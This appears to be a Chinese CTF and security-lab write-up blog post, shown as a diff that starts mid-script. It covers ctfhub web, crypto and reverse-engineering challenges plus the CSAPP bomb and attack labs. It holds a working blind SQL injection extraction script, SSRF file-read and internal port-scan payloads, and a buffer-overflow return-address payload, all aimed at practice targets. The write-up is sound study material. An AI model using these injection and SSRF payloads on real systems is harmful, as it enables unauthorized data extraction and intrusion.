class="string">&#x27;http://challenge-45c8b825d982f37a.sandbox.ctfhub.com:10800/?id=&#x27;</span></span><br><span class="line">starOperatorTime = []</span><br><span class="line">mark = <span class="string">&#x27;query_success&#x27;</span></span><br><span class="line"><span class="comment">#成功显示结果</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_name</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;sqcwertyuioplkjhgfdazxvbnm&#x27;</span>:</span><br><span class="line">            url = urlOPEN + <span class="string">&#x27;if(substr(database(),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> % (</span><br><span class="line">            j, i)</span><br><span class="line">            <span class="comment"># print(url+&#x27;%23&#x27;)</span></span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                name = name + i</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;database_name:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database_name()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_name</span>():</span><br><span class="line">    <span class="built_in">list</span> = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;sqcwertyuioplkjhgfdazxvbnm&#x27;</span>:</span><br><span class="line">                url = urlOPEN + <span class="string">&#x27;if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> % (</span><br><span class="line">                k, j, i)</span><br><span class="line">                <span class="comment"># print(url+&#x27;%23&#x27;)</span></span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name = name + i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">list</span>.append(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;table_name:&#x27;</span>, <span class="built_in">list</span>)</span><br><span class="line"><span class="comment"># start = time.time()</span></span><br><span class="line">table_name()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_name</span>():</span><br><span class="line">    <span class="built_in">list</span> = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3</span>):  <span class="comment"># 判断表里最多有4个字段</span></span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):  <span class="comment"># 判断一个 字段名最多有9个字符组成</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;sqcwertyuioplkjhgfdazxvbnm&#x27;</span>:</span><br><span class="line">                url = urlOPEN + <span class="string">&#x27;if(substr((select column_name from information_schema.columns where table_name=&quot;flag&quot;and table_schema= database() limit %d,1),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> % (</span><br><span class="line">                k, j, i)</span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name = name + i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">list</span>.append(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;column_name:&#x27;</span>, <span class="built_in">list</span>)</span><br><span class="line">column_name()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):  <span class="comment"># 判断一个值最多有51个字符组成</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">126</span>):</span><br><span class="line">            url = urlOPEN + <span class="string">&#x27;if(ascii(substr((select flag from flag),%d,1))=%d,1,(select table_name from information_schema.tables))&#x27;</span> % (</span><br><span class="line">            j, i)</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                name = name + <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;value:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_data()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="08-ssrf之内网访问"><a href="#08-ssrf之内网访问" class="headerlink" title="08 ssrf之内网访问"></a>08 ssrf之内网访问</h3><p>直接在url上&#x3D;127.0.0.1&#x2F;flag.php</p>
+<h3 id="09-ssrf之伪协议读取文件"><a href="#09-ssrf之伪协议读取文件" class="headerlink" title="09 ssrf之伪协议读取文件"></a>09 ssrf之伪协议读取文件</h3><p>让在web目录，根据经验php的web目录路径为：&#x2F;var&#x2F;www&#x2F;html&#x2F;</p>
+<p>构造payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="10-ssrf之端口扫描"><a href="#10-ssrf之端口扫描" class="headerlink" title="10 ssrf之端口扫描"></a>10 ssrf之端口扫描</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://challenge-e35db79659317cae.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000&quot;</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8000</span>,<span class="number">9001</span>):</span><br><span class="line">  url_1= <span class="string">f&quot;http://challenge-e35db79659317cae.sandbox.ctfhub.com:10800/?url=127.0.0.1:<span class="subst">&#123;index&#125;</span>&quot;</span></span><br><span class="line">  res = requests.get(url_1)</span><br><span class="line">  <span class="built_in">print</span>(index,res.text)</span><br></pre></td></tr></table></figure>
+
+<h1 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h1><h2 id="01题-What’s-RSA？"><a href="#01题-What’s-RSA？" class="headerlink" title="01题 What’s RSA？:"></a>01题 What’s RSA？:</h2><p>拥有私钥时：</p>
+<p>在kali中输入命令</p>
+<img src="https://img1.imgtp.com/2023/09/03/WPnUEM6v.png" alt="9109331575293a3e7d98246a9fa6d09" style="zoom:50%;">
+
+<h2 id="02题-RSA2："><a href="#02题-RSA2：" class="headerlink" title="02题 RSA2："></a>02题 RSA2：</h2><p>当拥有公钥时：</p>
+<p>首先从公钥中获取e和m</p>
+<img src="https://img1.imgtp.com/2023/09/03/09t9398N.png" alt="66e44afaf54afdf3fbc9561b4623676" style="zoom:50%;">
+
+<p>将16进制m进行转换</p>
+<img src="https://img1.imgtp.com/2023/09/03/JsKSJCN8.png" alt="4748f7702c1a3547d377fdf9b76fb8a" style="zoom:50%;">
+
+<p>利用<a target="_blank" rel="noopener" href="http://factordb.com/%E8%BF%9B%E8%A1%8C%E6%8B%86%E8%A7%A3%EF%BC%8C%E5%BE%97%E5%87%BAp,q">http://factordb.com/进行拆解，得出p,q</a></p>
+<p><img src="https://img1.imgtp.com/2023/09/03/UMeatThD.png" alt="image-20230723004645846"></p>
+<p>p&#x3D; <a target="_blank" rel="noopener" href="http://factordb.com/index.php?id=1100000000836631227">275127860351348928173285174381581152299</a></p>
+<p>q&#x3D;<a target="_blank" rel="noopener" href="http://factordb.com/index.php?id=1100000000836631226">319576316814478949870590164193048041239</a></p>
+<h2 id="03题-Wiener-Tricky："><a href="#03题-Wiener-Tricky：" class="headerlink" title="03题 Wiener Tricky："></a>03题 Wiener Tricky：</h2><h2 id="04题-crypto1"><a href="#04题-crypto1" class="headerlink" title="04题 crypto1:"></a>04题 crypto1:</h2><p>由于提示中有凯撒密码 并且加密形式是base64于是穷举凯撒密码中可以成功得出base64解密的字符串，但并未用上get data条件</p>
+<img src="https://img1.imgtp.com/2023/09/03/5WkC2nd1.png" alt="image-20230728110757271" style="zoom: 50%;">
+
+<img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230728110731917.png" alt="image-20230728110731917" style="zoom:50%;">
+
+<h2 id="05题-crypto2"><a href="#05题-crypto2" class="headerlink" title="05题 crypto2:"></a>05题 crypto2:</h2><p>同题目4后得到flag放入data中</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\Downloads\微信图片_20230729010733.png" alt="微信图片_20230729010733"></p>
+<p>得出flag 进入p2</p>
+<p>可以看出N1&#x3D;N2且e互素 共模攻击<br><code>import gmpy2</code><br><code>import libnum</code><br><code>s,s1,s2=gmpy2.gcdext(e1,e2)</code><br><code>m=(pow(c1,s1,n1)*pow(c2,s2,n2))%n1</code><br><code>print(libnum.n2s(int(m)).decode())</code></p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230730020447217.png" alt="image-20230730020447217"></p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="01题-Reverse-sign-in："><a href="#01题-Reverse-sign-in：" class="headerlink" title="01题 Reverse sign in："></a>01题 Reverse sign in：</h2><p>将其放入IDA中点击main函数和F5得到代码 其中可以看到通过判断flag正确与否的条件反推flag</p>
+<p>那么接下来看一下sub_400686的函数的判断条件</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731023100984.png" alt="image-20230731023100984"></p>
+<p>可以看出下面是此函数的代码 对其进行了异或操作</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731023435208.png" alt="image-20230731023435208"></p>
+<p>与818进行异或 下面进行编码</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731023711128.png" alt="image-20230731023711128"></p>
+<p><code>#include &lt;iostream&gt; using namespace std; int main() &#123;     int b[]=&#123;0x66,0x6D, 0x63, 0x64, 0x7F, 0x3C, 0x36, 0x72, 0x57, 0x42, 0x64,     0x3B, 0x7B, 0x52, 0x7C, 0x3C, 0x66, 0x54, 0x60,0x60, 0x27,     0x4A, 0x49, 0x7F, 0x71, 0x58, 0x52, 0x72, 0x7D, 0x75, 0x2A, 0x62&#125;;     char a[33];     for(int i=0;i&lt;=31;i++)     &#123;         a[i]= b[i]^i;     &#125;     for(int j=0;j&lt;=31;j++)     &#123;         cout&lt;&lt;a[j];     &#125;     cout&lt;&lt;endl;     return 0; &#125;</code></p>
+<p>得出flag</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731022421669.png" alt="image-20230731022421669"></p>
+<h2 id="02题-math："><a href="#02题-math：" class="headerlink" title="02题 math："></a>02题 math：</h2><p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731033641297.png" alt="image-20230731033641297"></p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731034103577.png" alt="image-20230731034103577"></p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731034126114.png" alt="image-20230731034126114"></p>
+<h2 id="03题-rev1："><a href="#03题-rev1：" class="headerlink" title="03题 rev1："></a>03题 rev1：</h2><p>首先阅读函数内容</p>
+<img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731223252403.png" alt="image-20230731223252403" style="zoom:67%;">
+
+<p>找到有用户名密码的函数</p>
+<img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731223421005.png" alt="image-20230731223421005" style="zoom: 67%;">
+
+<img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731223500230.png" alt="image-20230731223500230" style="zoom: 67%;">
+
+
+
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731223535007.png" alt="image-20230731223535007"></p>
+<p>可以看到用户名的判断中需要和login_name的ascii码相同 得出用户名superuser</p>
+<img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731224138342.png" alt="image-20230731224138342" style="zoom:67%;">
+
+<p>对应编写程序得到</p>
+<img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731224438711.png" alt="image-20230731224438711" style="zoom:50%;">
+
+<p>得出密码uvwpqrslmnohijk</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230731230530385.png" alt="image-20230731230530385"></p>
+<p>得出flag</p>
+<h2 id="04题-rev2"><a href="#04题-rev2" class="headerlink" title="04题 rev2:"></a>04题 rev2:</h2><p>注意到上题所说的another flag</p>
+<p>Here is another one question hint info: transpose</p>
+<p>Here is another flag: <code>0x19,0xffffffa5,0xffffffc9,0xffffffe8,0xffffffa4,0xffffffb8,0x08,0xffffffda,0xffffffd0,0xffffff8a,0xffffffc9,0xffffffc5,0x6a,0xffffffe1,0xffffffdd,0xffffffd8,0xffffffdd,0xffffff84,0x4b,0xffffffca,0xffffffee,0xffffffc6,0xffffffe7,0x42,0x04,0xfffffff7,0xffffff96,0xffffffe4,0xffffffe3,0x5d,0xffffff8c,0xffffffaf,0xffffffeb,0xfffffff5,0xffffffa2,0x4a,0xffffffa4,0xfffffff2,0xffffff8d,0xffffffb1,0xffffffc8,0x12,</code></p>
+<h2 id="05题-二进制炸弹："><a href="#05题-二进制炸弹：" class="headerlink" title="05题 二进制炸弹："></a>05题 二进制炸弹：</h2><h4 id="phase-1-简单寻址比较"><a href="#phase-1-简单寻址比较" class="headerlink" title="phase_1  简单寻址比较"></a>phase_1  简单寻址比较</h4><p>首先看到phase_1   它call了一个函数指令</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230822211704988.png" alt="image-20230822211704988"></p>
+<p>x86-64的过程调用原则</p>
+<p>1.函数调用中，利用%rax寄存器保存返回值。</p>
+<p>2.关于参数传递，如果函数参数不超过6个，会依次通过%rdi,%rsi,%rdx,%rcx,%r8,%r9传递，如果超过6个参数，超出参数使用栈传递。</p>
+<p>汇编指令：</p>
+<p>mov ax,bx  将ax寄存器内容给b寄存器</p>
+<p>mov 立即数,%ax  将立即数内容给ax</p>
+<p>mov %ax,%bx 将ax寄存器的数复制给bx</p>
+<p>sub ax,bx   ax寄存器内容减去bx寄存器内容存入ax</p>
+<p>实验先导条件：</p>
+<p>1.进行反汇编 得到具体执行内容</p>
+<p><code>objdump -d bomb &gt; bomb.s</code></p>
+<p>2.使用gdb进行调试</p>
+<p><code>gdb bomb</code></p>
+<p>3.设置断点</p>
+<p><code>break phase_1</code></p>
+<p><code>break *0x400ee9</code></p>
+<p>4.清除断点</p>
+<p>clear +上面</p>
+<p>5.查看寄存器字符串</p>
+<p><code>x/s $esi</code></p>
+<p>6.检查寄存器或者某个地址</p>
+<p><code>x/4wd $esi</code></p>
+<p>7.layout asm</p>
+<p>分析phase_1代码结合过程调用原则</p>
+<p>1.输入给rax作为第一个值，立即数0x402400给esi作为第二个值</p>
+<p>2.函数进行比较看eax结果是否为0，若为0跳过</p>
+<p>3.现在问题是要知道立即数0x402400存的什么</p>
+<p>在400ee9也就是esi后面设置断点后，检查字符串</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230822215000066.png" alt="image-20230822215000066"></p>
+<p>复制并输入</p>
+<p>Border relations with Canada have never been better.</p>
+<p>这是第一个阶段的输入</p>
+<p>gedit 文件名字 创建文件</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230823204259128.png" alt="image-20230823204259128"></p>
+<h4 id="phase-2-栈、指针与循环"><a href="#phase-2-栈、指针与循环" class="headerlink" title="phase_2  栈、指针与循环"></a>phase_2  栈、指针与循环</h4><p>下面进行第二个阶段</p>
+<p>运行第二步时先设置break phase_2</p>
+<p>输入r test 跳过第一步 到断点后ni</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230823184953085.png" alt="image-20230823184953085"></p>
+<p>经过第一阶段已经了解寄存器使用规则，先看函数内容</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230823194258569.png" alt="image-20230823194258569"></p>
+<p>汇编指令：</p>
+<p>lea    0x4(%rsi),%rcx 加载一个内存地址将 %rsi寄存器中的值加上偏移量 0x4计算出的内存地址存储到目标寄存器%rcx</p>
+<p>查看它的输入前后来确定输入数量，可以看到他输入前将eax置为立即数0，再往前就是将立即数0x4025c3存到esi中 查看立即数内字符 可以看出有六个数字</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230823212815266.png" alt="image-20230823212815266"></p>
+<p>读取6个字符后，首先rsp与1进行比较，相等跳到30</p>
+<p>30中将bx指向栈顶sp指针+4个字节-&gt;第二个数 bp指向sp加24个字节-&gt;第6个数</p>
+<p>再跳回17 bx的前一个数也就是第一个数(上面是指针带地址所以可以找到第一个数)存ax，让他乘2与bx(第二个数)比较判断是否为2倍关系。然后继续循环。</p>
+<p>总结：循环和c语言指针问题</p>
+<h4 id="phase-3-switch分支"><a href="#phase-3-switch分支" class="headerlink" title="phase_3 switch分支"></a>phase_3 switch分支</h4><p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230824153953913.png" alt="image-20230824153953913"></p>
+<p>先看源代码</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230824153053407.png" alt="image-20230824153053407"></p>
+<p>rdx存第二个，rcx存第三个，判断eax作为接口返回值和1相比，判断7和第二个数，7大跳炸弹-&gt;让7小于那个数</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230824193854239.png" alt="image-20230824193854239"></p>
+<p>直接告诉你两个数</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230824193830593.png" alt="image-20230824193830593"></p>
+<p>然后继续跳</p>
+<p>比较第一个数和7，写的2 比过之后gdb带着跳到该去的分支 可以看到第二个要填707</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230824200021842.png" alt="image-20230824200021842"></p>
+<p>成功做出</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230824200239519.png" alt="image-20230824200239519"></p>
+<h4 id="phase-4-递归-救命忘记用IDA看汇编生做的"><a href="#phase-4-递归-救命忘记用IDA看汇编生做的" class="headerlink" title="phase_4 递归(救命忘记用IDA看汇编生做的)"></a>phase_4 递归(救命忘记用IDA看汇编生做的)</h4><p>第四个阶段</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230831133922755.png" alt="image-20230831133922755"></p>
+<p>汇编指令</p>
+<blockquote>
+<p>shr 位操作 将其二进制表示向右移动一定的位数</p>
+<p>sar 算数位移 最高位补按照有符号规则补</p>
+<p>lea 计算有效地址  其中lea (%rax,%rsi,1),%ecx，带有偏移和索引的内存寻址方式。将 <code>%rax</code> 寄存器的值加上 <code>%rsi</code> 寄存器的值，并且不进行缩放（因为缩放因子是1），得到的结果作为内存地址。并把内存地址传入%ecx中。其中lea 0x1(%rcx),%esi，把rcx的值加上0x1，作为内存地址存入esi中。</p>
+<p>jle Jump if Less Than or Equal cmp中后减前(cx-di)之后会置标志位 大于SF置为1 小于SF置为0 等于ZF置为1.也就是cx(后)是否小于等于di(前)</p>
+</blockquote>
+<p>mov %edx,%eax时，参考上面edx被赋值为14，此时eax,edx均为14，di为传参第一个参数，si为第二个参数，看到后面可知第二个参数与0进行比较，应该是0</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\Desktop\2.PNG"></p>
+<p>故d6做完后ax,cx,dx均为14，d8做完后，将ecx向右移了31位，正数左补0，于是cx变成0，把cx加入ax中，ax仍为14</p>
+<p>dd的sar语句做完之后，eax变为7</p>
+<p>df的lea指令做完后，ecx变为7，下一步比较edi和ecx，也就是传入的第一个参数和固定值7比较</p>
+<p>e4跳转指令执行后，由于我传入数为10，7小于10 符合跳转指令至f2</p>
+<p>把eax置为0 并进行和上一个相同的比较 如果大于等于跳转 7小于10 不符合跳转指令</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\Desktop\1.PNG" alt="1"></p>
+<p>继续执行lea指令将rcx+1存入si</p>
+<p>此时ax&#x3D;0 cx&#x3D;7 dx&#x3D;14 si&#x3D;8 di&#x3D;10</p>
+<p>再次循环func4 把dx赋ax,ax-si,ax赋cx,cx右移</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ax cx dx si di</span><br><span class="line">14 7 14 8 10</span><br><span class="line"> 6 7 14 8 10</span><br><span class="line"> 6 6 14 8 10 </span><br><span class="line"> 6 0 14 8 10</span><br><span class="line"> 6 0 14 8 10</span><br><span class="line"> 3 0 14 8 10</span><br><span class="line">3 11 14 8 10</span><br><span class="line">3 11 10 8 10</span><br></pre></td></tr></table></figure>
+
+<p>再次循环func4</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ax cx dx si di</span><br><span class="line">10 11 10 8 10</span><br><span class="line"> 2 11 10 8 10</span><br><span class="line"> 2  2 10 8 10</span><br><span class="line"> 2  0 10 8 10</span><br><span class="line"> 2  0 10 8 10</span><br><span class="line"> 1  0 10 8 10</span><br><span class="line"> 1  9 10 8 10</span><br><span class="line">跳转</span><br><span class="line"> 0  9 10 8 10</span><br><span class="line"> 0 9 10 10 10</span><br></pre></td></tr></table></figure>
+
+<p>再次</p>
+<p>比较时</p>
+<p>0 10 10 10 10</p>
+<p>发现是不容易找到规律的循环后，我们进行c语言代码编写 递归要确定<strong>有几个参数 如何运算的</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//func4 伪c 三个参数 di si dx 分别为第一个参数 第二个参数 14</span></span><br><span class="line">ax=dx;</span><br><span class="line">ax=ax-si;<span class="comment">//(3-2)</span></span><br><span class="line">cx=ax;</span><br><span class="line">cx&gt;&gt;<span class="number">31</span>;<span class="comment">//取符号位</span></span><br><span class="line">ax=ax+cx;<span class="comment">//(3-2)</span></span><br><span class="line">ax&gt;&gt;<span class="number">1</span>;<span class="comment">//(3-2)/2 </span></span><br><span class="line">cx=ax+si;<span class="comment">//(3-2)/2+2 2-3中间那个数</span></span><br><span class="line"><span class="keyword">if</span>(cx&lt;=di)<span class="comment">//中间那个数与第一个参数比较</span></span><br><span class="line">    跳转</span><br><span class="line">    ax=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(cx&gt;=di)</span><br><span class="line">        跳转</span><br><span class="line">        ret<span class="comment">//等于的时候出去</span></span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">        si=cx+<span class="number">1</span>;<span class="comment">//像二分法</span></span><br><span class="line">		重回func4</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    dx=cx<span class="number">-1</span>;</span><br><span class="line">	重回func4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230901141220849.png" alt="image-20230901141220849"></p>
+<h4 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h4><p>第五个炸弹的函数如下：</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230905135853755.png" alt="image-20230905135853755"></p>
+<p>首先判断字符串长度是否为6</p>
+<p>汇编指令</p>
+<p>异或：清零</p>
+<h2 id="06题-缓冲区溢出："><a href="#06题-缓冲区溢出：" class="headerlink" title="06题 缓冲区溢出："></a>06题 缓冲区溢出：</h2><p>ctarget:易受代码注入攻击的可执行程序</p>
+<p>rtarget:易受返回导向编程攻击的可执行程序</p>
+<p>cookie.txt: 8位十六进制代码，您将在攻击中将其⽤作唯⼀标识符。</p>
+<p>farm.c：目标“小工具农场”的源代码，将使用它来生成面向返回的编程攻击</p>
+<p>hex2raw：⽣成攻击字符串的实⽤程序</p>
+<p>学习背景：CSAPP第3.10节</p>
+<p>首先找到了ctarget中的touch1、2、3</p>
+<blockquote>
+<p><strong>调用指令</strong>执行时</p>
+<p>执行调用指令时，当前指令的下一条指令的地址（通常是当前指令地址加上一个偏移量）会被计算出来。</p>
+<p>计算得到的下一条指令的地址会被推入栈的栈顶，同时栈顶指针会相应地减小，以指向新的栈顶位置。</p>
+<p>当函数执行完毕并准备返回时，会从栈中弹出保存的返回地址，栈顶指针也会相应地增加，以指向栈的新的栈顶位置。</p>
+</blockquote>
+<h4 id="touch1"><a href="#touch1" class="headerlink" title="touch1"></a>touch1</h4><p>通过上面的getbuf查看缓冲区大小</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230906215341923.png" alt="image-20230906215341923"></p>
+<p>查看可知有40个字节</p>
+<p>查看touch1函数，得知我们要调Touch1函数</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230907162833917.png" alt="image-20230907162833917"></p>
+<p>结合四十字节的缓冲区，我们先写入40字节字符 注(00)是一个字节 后面加上touch1地址</p>
+<p>写入test文件中 其中调用touch1时是小端地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00 /*其中touch1地址为0x4017c0</span><br></pre></td></tr></table></figure>
+
+<p>得到这个可以看出已经通过touch1 得到</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230907144401247.png" alt="image-20230907144401247"></p>
+<h4 id="touch2"><a href="#touch2" class="headerlink" title="touch2"></a>touch2</h4><p>调用函数时，先存下一个指令的地址压入栈，执行调用结束，最终遇到ret指令，下一条指令弹出并进行跳转。</p>
+<p>于是为了跳转到touch2先把touch2的起始地址压入栈中 这样再ret的时候就会直接到touch2</p>
+<p>缓冲区中超出buf部分则是返回地址</p>
+<p>注意是返回地址而不是可以执行指令</p>
+<p>将想执行的指令放入栈中，然后在缓冲区处打断点，在断点处查看此时sp的值</p>
+<p>写入指令为先mov再push再ret</p>
+<p>这三条指令的分布位置为</p>
+<p>栈顶(查看的地址)-mov-push-ret</p>
+<p>就是将开始本应该返回call的下一条指令的地址改成了缓冲区的地址</p>
+<p>可以直接执行缓冲区的指令</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230907163644923.png" alt="image-20230907163644923"></p>
+<p>至于指令传输的字符问题</p>
+<p>应该的指令是这样的</p>
